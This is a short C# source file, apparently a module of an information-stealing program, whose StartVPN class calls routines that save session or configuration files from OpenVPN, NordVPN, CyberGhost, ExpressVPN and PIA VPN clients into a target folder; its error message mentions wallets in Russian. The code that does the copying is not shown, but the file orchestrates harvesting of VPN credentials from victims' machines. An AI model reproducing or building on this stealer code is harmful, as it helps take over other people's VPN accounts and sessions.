using System;
using System.Threading.Tasks;

namespace SHARP
{
    internal class StartVPN
    {
      public static async Task Start(string head)
      {
        try
        {
          OpenVPN.Save(head);
          NordVPN.Save(head);
          CyberGhost.SaveFileSession(head);
          ExpressVPN.SaveFileSession(head);
          PIAVPN.SaveFileSession(head);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex?.ToString() + "кошельки :(");
        }
      }
    }
}
